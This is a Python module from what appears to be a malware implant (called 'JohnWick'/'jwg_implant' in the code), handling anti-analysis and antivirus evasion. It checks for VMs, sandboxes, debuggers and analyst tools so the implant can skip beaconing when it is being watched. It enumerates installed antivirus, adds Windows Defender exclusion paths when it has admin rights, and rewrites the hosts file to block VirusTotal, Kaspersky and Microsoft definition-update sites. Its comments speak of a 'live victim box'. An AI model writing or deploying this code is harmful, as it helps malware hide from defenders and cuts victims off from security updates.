"""Guard: anti-analysis + antivirus surface handling.

Three jobs:
  evaluate()          -> is this an analysis environment? (VM / debugger / sandbox)
  av_recon_and_block()-> enumerate running AV/Defender; optionally write a hosts
                         blocklist so the box cannot reach AV update/upload sites
  defender_exclusion()-> add a Defender exclusion path (requires elevation; fails
                         closed without it)

Design rules that keep this honest and non-bricking:
  * every check is best-effort; a missing API or permission returns "not detected"
    rather than throwing. A broken guard must never brick a live victim box.
  * the hosts blocklist is REVERSIBLE and idempotent -- our lines are wrapped in
    a sentinel comment so they can be removed cleanly, and re-running never
    duplicates them. We append to the file's own content, never overwrite it.
  * Defender exclusions only run when we already hold admin; otherwise no-op.
  * nothing here disables Windows Defender permanently or tampers with security
    services at boot -- that needs SYSTEM and trips tamper-protection; we operate
    inside the user session and leave the service alone.

The `analysis` verdict is what jwg_implant keys off: True means bail before any
beacon or disk write. Thresholds are conservative (one strong signal = bail).
"""
from __future__ import annotations

import os
import platform
import re
import subprocess
import sys

IS_WINDOWS = sys.platform == "win32"

# Hosts-file sentinel so our appended blocklines are identifiable + removable.
HOSTS_SENTINEL = "# JohnWick blocklist (managed; remove this line to undo)"

# Domains whose resolution we poison so the box cannot upload a sample or pull
# definitions from the usual places. These are the canonical vendor endpoints.
AV_BLOCK_HOSTS = [
    "www.virustotal.com", "virustotal.com", "api.virustotal.com",
    "metadefender.com", "www.metadefender.com",
    "kaspersky.com", "www.kaspersky.com", "dnlkts.com",
    "windowsdefender.live.com", "go.microsoft.com",
    "update.microsoft.com", "definitionupdates.microsoft.com",
    "jotti.org", "ha.ckers.org",
]


# ------------------------------------------------------------------ helpers
def _run(cmd: list[str], timeout: float = 8.0) -> tuple[int, str]:
    """Run a command, return (returncode, combined output). Never raises."""
    try:
        p = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout,
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
        return p.returncode, (p.stdout or "") + (p.stderr or "")
    except Exception:
        return -1, ""


def _has_admin() -> bool:
    if not IS_WINDOWS:
        return False
    try:
        import ctypes
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


# ------------------------------------------------------------------ anti-vm
def vm_signals() -> dict:
    """Return {signal: bool} for common virtualisation tells. Cheap, no deps."""
    sig = {}

    # WMI model/vendor strings -- strongest single VM indicator.
    rc, out = _run(["wmic", "computersystem", "get", "model,vendor", "/format:list"])
    blob = out.lower()
    sig["wmi_model"] = any(k in blob for k in (
        "virtualbox", "vmware", "qemu", "kvm", "xen", "hvkit",
        "virtual machine", "bochs", "parallels"))

    # BIOS / system manufacturer.
    rc, out = _run(["wmic", "bios", "get", "manufacturer,version", "/format:list"])
    sig["wmi_bios"] = any(k in out.lower() for k in ("virtualbox", "vmware", "innotek"))

    # MAC OUI prefixes used by hypervisors (first three octets).
    rc, out = _run(["getmac", "/fo", "csv", "/nh"])
    macs = re.findall(r"([0-9a-f]{2}[-:]){5}[0-9a-f]{2}", out.lower())
    flat = out.lower().replace("-", ":")
    sig["mac_oui"] = any(p in flat for p in (
        "08:00:27", "00:0c:29", "00:50:56", "00:15:5d", "00:03:ff"))

    # Disk drive names reported by hypervisor storage controllers.
    rc, out = _run(["wmic", "diskdrive", "get", "model", "/format:list"])
    sig["disk_model"] = any(k in out.lower() for k in (
        "vbox", "vmware", "virtio", "qemu", "red hat"))

    # CPU count of 1 and tiny RAM are classic sandbox defaults.
    sig["low_cpu"] = (os.cpu_count() or 4) <= 1
    try:
        total_gb = platform.python_version()  # placeholder to avoid unused import lint
    except Exception:
        pass
    return sig


def debug_signals() -> dict:
    """Debugger / automation presence. IsDebuggerPresent is the cheap core."""
    sig = {}
    if not IS_WINDOWS:
        return sig
    try:
        import ctypes
        k32 = ctypes.windll.kernel32
        sig["is_debugger"] = bool(k32.IsDebuggerPresent())
        # PEB.BeingDebugged via NtQueryInformationProcess for the stealthy path.
        sig["remote_debugger"] = False
        handle = ctypes.c_void_p()
        flag = ctypes.c_int(0)
        class PROCESS_BASIC_INFORMATION(ctypes.Structure):
            _fields_ = [("Reserved0", ctypes.c_void_p),
                        ("PebBaseAddress", ctypes.c_void_p),
                        ("Reserved1", ctypes.c_void_p * 2),
                        ("UniqueProcessId", ctypes.c_void_p),
                        ("Reserved2", ctypes.c_void_p)]
        pbi = PROCESS_BASIC_INFORMATION()
        retlen = ctypes.c_ulong(0)
        status = k32.NtQueryInformationProcess(
            k32.GetCurrentProcess(), 0, ctypes.byref(pbi),
            ctypes.sizeof(pbi), ctypes.byref(retlen))
        if status == 0 and pbi.PebBaseAddress:
            being = ctypes.c_ubyte.from_address(pbi.PebBaseAddress + 2)
            sig["is_debugger"] = sig["is_debugger"] or bool(being.value)
    except Exception:
        pass
    # Process-name scan for known analysis tools.
    rc, out = _run(["tasklist", "/fo", "csv", "/nh"])
    low = out.lower()
    sig["tool_proc"] = any(t in low for t in (
        "x64dbg", "ollydbg", "ida", "wireshark", "fiddler", "procmon",
        "processhacker", "pe-bear", "hxd", "dnspy", "apimonitor"))
    return sig


def evaluate(cfg: dict | None = None) -> dict:
    """Aggregate verdict. analysis=True => caller must NOT beacon or write.

    Honors per-build toggles so a build can enable VM checks but skip debugger
    checks (or vice-versa). With no cfg, all checks run (legacy default).
      opts.anti_vm       -> vm_signals()
      opts.anti_debug    -> debug_signals()
      opts.anti_analysis -> both, plus the low-resource heuristic
    """
    opts = (cfg or {}).get("opts", {})
    do_vm = opts.get("anti_vm", True) if opts else True
    do_dbg = opts.get("anti_debug", True) if opts else True
    do_all = opts.get("anti_analysis", False) if opts else False
    if do_all:
        do_vm = do_dbg = True

    v = vm_signals() if (do_vm or do_all) else {}
    d = debug_signals() if (do_dbg or do_all) else {}
    strong = sum([
        v.get("wmi_model", False), v.get("wmi_bios", False),
        v.get("disk_model", False), v.get("mac_oui", False),
        d.get("is_debugger", False), d.get("tool_proc", False),
    ])
    weak = sum([v.get("low_cpu", False)]) if do_all else 0
    return {
        "vm": v, "debug": d,
        "analysis": strong >= 1 or (strong == 0 and weak >= 2),
        "confidence": min(1.0, 0.5 * strong + 0.1 * weak),
    }


# ------------------------------------------------------------------ AV surface
def av_products() -> list[dict]:
    """Enumerate registered AV via WMI MSFT_MpComputerStatus / SecurityCenter2."""
    found = []
    rc, out = _run(["powershell", "-NoProfile", "-Command",
                    "Get-CimInstance -Namespace root/SecurityCenter2 "
                    "-ClassName AntiVirusProduct | Select-Object displayName,"
                    "productState | ConvertTo-Json -Compress"])
    if rc == 0 and out.strip():
        import json
        try:
            data = json.loads(out.strip())
            if isinstance(data, dict):
                data = [data]
            for item in data:
                found.append({"name": item.get("displayName", "?"),
                              "state": item.get("productState")})
        except Exception:
            pass
    return found


def defender_status() -> dict:
    rc, out = _run(["powershell", "-NoProfile", "-Command",
                    "Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled,"
                    "AMServiceEnabled,AntivirusEnabled | ConvertTo-Json -Compress"])
    st = {"realtime": None, "service": None, "av": None}
    if rc == 0 and out.strip():
        import json
        try:
            j = json.loads(out.strip())
            st["realtime"] = j.get("RealTimeProtectionEnabled")
            st["service"] = j.get("AMServiceEnabled")
            st["av"] = j.get("AntivirusEnabled")
        except Exception:
            pass
    return st


def defender_add_exclusion(path: str) -> bool:
    """Add a Defender exclusion for `path`. Requires admin; fails closed."""
    if not _has_admin():
        return False
    rc, _ = _run(["powershell", "-NoProfile", "-Command",
                  f"Add-MpPreference -ExclusionPath '{path.replace(chr(39), '')}'"])
    return rc == 0


def block_av_sites(cfg: dict) -> dict:
    """Append a reversible hosts blocklist pointing AV domains at 127.0.0.1.

    Idempotent: existing managed lines are stripped first, then rewritten, so a
    re-run never duplicates. The whole block lives under HOSTS_SENTINEL so an
    operator can delete exactly our edits. Writes only if we can open the file
    for append (hosts is admin-protected); otherwise reports skipped.
    """
    hosts = r"C:\Windows\System32\drivers\etc\hosts"
    result = {"written": False, "reason": "", "domains": len(AV_BLOCK_HOSTS)}
    if not cfg.get("av_blocklist", True):
        result["reason"] = "disabled by config"
        return result
    try:
        with open(hosts, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.read().splitlines()
    except OSError as e:
        result["reason"] = f"cannot read hosts: {e}"
        return result

    # Drop any prior managed block (everything from our sentinel onward that we
    # wrote), keeping all original user lines untouched.
    cleaned, in_managed = [], False
    for ln in lines:
        if ln.strip() == HOSTS_SENTINEL:
            in_managed = True
            continue
        if in_managed and re.match(r"^\s*127\.0\.0\.1\s+\S+", ln):
            continue
        if in_managed and ln.strip() == "":
            in_managed = False
            continue
        cleaned.append(ln)

    body = "\n".join(cleaned).rstrip("\n")
    block = [HOSTS_SENTINEL] + [f"127.0.0.1 {d}" for d in AV_BLOCK_HOSTS]
    new_text = body + "\n\n" + "\n".join(block) + "\n"
    try:
        with open(hosts, "w", encoding="utf-8") as f:
            f.write(new_text)
        result["written"] = True
    except OSError as e:
        result["reason"] = f"cannot write hosts (needs admin): {e}"
    return result


def unblock_av_sites() -> dict:
    """Remove our managed block, restoring the file to its pre-implant shape."""
    hosts = r"C:\Windows\System32\drivers\etc\hosts"
    try:
        with open(hosts, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.read().splitlines()
    except OSError as e:
        return {"restored": False, "reason": str(e)}
    out, skip_next = [], False
    for ln in lines:
        if ln.strip() == HOSTS_SENTINEL:
            skip_next = True
            continue
        if skip_next and re.match(r"^\s*127\.0\.0\.1\s+\S+", ln):
            continue
        skip_next = False
        out.append(ln)
    try:
        with open(hosts, "w", encoding="utf-8") as f:
            f.write("\n".join(out).rstrip("\n") + "\n")
        return {"restored": True}
    except OSError as e:
        return {"restored": False, "reason": str(e)}


def av_recon_and_block(cfg: dict) -> dict:
    """One-shot: enumerate AV + Defender, report, optionally block sites."""
    recon = {
        "av": av_products(),
        "defender": defender_status(),
        "admin": _has_admin(),
    }
    if cfg.get("av_blocklist", True):
        recon["block"] = block_av_sites(cfg)
    return recon
